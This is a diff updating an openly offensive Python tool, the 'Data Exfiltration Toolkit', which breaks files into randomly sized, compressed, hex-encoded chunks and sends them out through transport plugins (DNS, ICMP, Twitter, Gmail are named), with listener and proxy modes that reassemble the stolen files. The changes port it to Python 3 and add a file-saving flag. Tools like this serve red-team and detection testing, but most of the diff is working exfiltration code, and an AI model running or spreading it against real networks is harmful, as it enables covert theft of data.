@@ -33,7 +33,9 @@ MIN_TIME_SLEEP = 1
 MAX_TIME_SLEEP = 30
 MIN_BYTES_READ = 1
 MAX_BYTES_READ = 500
+BUF_LEN        = 4096
 COMPRESSION    = True
+SAVE_FILE      = False
 files = {}
 threads = []
 config = None
@@ -115,20 +117,14 @@ def aes_decrypt(message, key=KEY):
     except:
         return None
 
-# Do a md5sum of the file
-def md5(fname):
+# Do a md5sum of the buffer
+def md5(buffer):
     hash_md5 = hashlib.md5()
-    with open(fname, "rb") as f:
-        for chunk in iter(lambda: f.read(4096), b""):
-            hash_md5.update(chunk)
-    return hash_md5.hexdigest()
 
-# OLD md5
-#def md5(f):
-#    hash = hashlib.md5()
-#    for chunk in iter(lambda: f.read(4096), ""):
-#        hash.update(chunk)
-#    return hash.hexdigest()
+    for chunk in iter(lambda: buffer.read(BUF_LEN), b""):
+        hash_md5.update(chunk)
+
+    return hash_md5.hexdigest()
 
 function_mapping = {
     'display_message': display_message,
@@ -176,6 +172,14 @@ class Exfiltration(object):
             return True
 
     def register_plugin(self, transport_method, functions):
+        """
+
+        :param transport_method:
+        :param functions:
+            A dict include send, listen, proxy
+            send: Callable[[str], None]
+        :return:
+        """
         self.plugins[transport_method] = functions
 
     def get_plugins(self):
@@ -198,7 +202,7 @@ class Exfiltration(object):
     def use_plugin(self, plugins):
         tmp = {}
         for plugin_name in plugins.split(','):
-            if (plugin_name in self.plugins):
+            if plugin_name in self.plugins:
                 tmp[plugin_name] = self.plugins[plugin_name]
         self.plugins.clear()
         self.plugins = tmp
@@ -224,6 +228,10 @@ class Exfiltration(object):
                     (files[jobid]['filename'], files[jobid]['checksum']))
 
     def retrieve_file(self, jobid):
+        if not SAVE_FILE:
+            info("Do not save file, use -s to save files")
+            return
+
         global files
         fname = files[jobid]['filename']
         filename = "%s.%s" % (fname.replace(
@@ -231,42 +239,44 @@ class Exfiltration(object):
         #Reorder packets before reassembling / ugly one-liner hack
         files[jobid]['packets_order'], files[jobid]['data'] = \
                 [list(x) for x in zip(*sorted(zip(files[jobid]['packets_order'], files[jobid]['data'])))]
-        content = ''.join(str(v) for v in files[jobid]['data']).decode('hex')
+        # content = ''.join(str(v) for v in files[jobid]['data']).decode('hex')
+        content = bytes.fromhex(''.join(str(v) for v in files[jobid]['data']))
         #content = aes_decrypt(content, self.KEY)
         if COMPRESSION:
             content = decompress(content)
         try:
-            with open(filename, 'w') as f:
+            with open(filename, 'wb') as f:
                 f.write(content)
         except IOError as e:
-            warning("Got %s: cannot save file %s" % filename)
+            warning("Got {}: cannot save file {}".format(filename, filename))
             raise e
 
         #if (files[jobid]['checksum'] == md5(open(filename))):
-        if (files[jobid]['checksum'] == md5(filename)):
-            ok("File %s recovered" % (fname))
+        if files[jobid]['checksum'] == md5(open(filename, 'rb')):
+            ok("File %s recovered" % fname)
         else:
-            warning("File %s corrupt!" % (fname))
+            warning("File %s corrupt!" % fname)
 
         del files[jobid]
         
         sys.stdout.flush()
         
 
-    def retrieve_data(self, data):
+    def retrieve_data(self, data: bytes):
         global files
         try:
-            message = data
-            if (message.count("|!|") >= 2):
+            message = data.decode()
+            print(message)
+            if message.count("|!|") >= 2:
                 info("Received {0} bytes".format(len(message)))
                 message = message.split("|!|")
                 jobid = message[0]
 
                 # register packet
-                if (message[2] == "REGISTER"):
+                if message[2] == "REGISTER":
                     self.register_file(message)
                 # done packet
-                elif (message[2] == "DONE"):
+                elif message[2] == "DONE":
                     files[jobid]['packets_len'] = int(message[1])
                     #Check if all packets have arrived
                     if files[jobid]['packets_len'] == len(files[jobid]['data']):
@@ -276,7 +286,7 @@ class Exfiltration(object):
                 # data packet
                 else:
                     # making sure there's a jobid for this file
-                    if (jobid in files and message[1] not in files[jobid]['packets_order']):
+                    if jobid in files and message[1] not in files[jobid]['packets_order']:
                         files[jobid]['data'].append(''.join(message[2:]))
                         files[jobid]['packets_order'].append(int(message[1]))
                         #In case this packet was the last missing one
@@ -287,7 +297,6 @@ class Exfiltration(object):
             
         except:
             raise
-            pass
 
 
 class ExfiltrateFile(threading.Thread):
@@ -307,18 +316,16 @@ class ExfiltrateFile(threading.Thread):
         # checksum
         # TODO fix stdin mode if necessary
         if self.file_to_send == 'stdin':
-            file_content = sys.stdin.read()
-            buf = StringIO(file_content)
-            e = StringIO(file_content)
+            # load entire stdin in memory
+            stdin = sys.stdin.buffer.read()
+            buffer = BytesIO(stdin)
+            del stdin
         else:
-            with open(self.file_to_send, 'rb') as f:
-                file_content = f.read()
-            #print("CHECKPOINT - File read, before BytesIO")
-            #buf = BytesIO(file_content)
-            e = BytesIO(file_content)
-            self.checksum = md5(self.file_to_send)
-        #self.checksum = md5(buf)
-        del file_content
+            buffer = open(self.file_to_send, 'rb')
+            print("CHECKPOINT - File read, before BytesIO")
+            # e = BytesIO(file_content)
+        self.checksum = md5(buffer)
+        buffer.seek(0)
 
         print("CHECKPOINT - Checksum")
         print(self.checksum)
@@ -338,17 +345,16 @@ class ExfiltrateFile(threading.Thread):
 
         # sending the data
         f = tempfile.SpooledTemporaryFile()
-        data = e.read()
+        data = buffer.read()
         if COMPRESSION:
             data = compress(data)
-        #f.write(aes_encrypt(data, self.exfiltrate.KEY))
+        # f.write(aes_encrypt(data, self.exfiltrate.KEY))
         f.write(data)
         f.seek(0)
-        e.close()
 
         packet_index = 0
-        while (True):
-            data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)) #.encode('hex')
+        while True:
+            data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)).hex() #.encode('hex')
             if not data_file:
                 break
             plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
@@ -382,6 +388,7 @@ def main():
     global MAX_TIME_SLEEP, MIN_TIME_SLEEP, KEY, MAX_BYTES_READ, MIN_BYTES_READ, COMPRESSION
     global threads, config
     global dukpt_client, dukpt_server
+    global SAVE_FILE
 
     parser = argparse.ArgumentParser(
         description='Data Exfiltration Toolkit (@PaulWebSec)')
@@ -395,6 +402,8 @@ def main():
                         default=None, help="Plugins to use (eg. '-p dns,twitter')")
     parser.add_argument('-e', action="store", dest="exclude",
                         default=None, help="Plugins to exclude (eg. '-e gmail,icmp')")
+    parser.add_argument('-s', action="store_true",
+                        dest="save", default=False, help="Save File")
     listenMode = parser.add_mutually_exclusive_group()
     listenMode.add_argument('-L', action="store_true",
                         dest="listen", default=False, help="Server mode")
@@ -402,7 +411,7 @@ def main():
                         dest="proxy", default=False, help="Proxy mode")
     results = parser.parse_args()
 
-    if (results.config is None):
+    if results.config is None:
         print("Specify a configuration file!")
         parser.print_help()
         sys.exit(-1)
@@ -430,8 +439,14 @@ def main():
         KEY  = config['AES_KEY']
     app = Exfiltration(results, KEY)
 
+    if results.save:
+        print("enable file saving")
+        SAVE_FILE = True
+    else:
+        print("disable file saving")
+
     # LISTEN/PROXY MODE
-    if (results.listen or results.proxy):
+    if results.listen or results.proxy:
         threads = []
         plugins = app.get_plugins()
         for plugin in plugins:
@@ -444,11 +459,11 @@ def main():
             threads.append(thread)
     # EXFIL mode
     else:
-        if (results.folder is None and results.file is None):
+        if results.folder is None and results.file is None:
             warning("[!] Specify a file or a folder!")
             parser.print_help()
             sys.exit(-1)
-        if (results.folder):
+        if results.folder:
             files = ["{0}{1}".format(results.folder, f) for
                      f in listdir(results.folder)
                      if isfile(join(results.folder, f))]
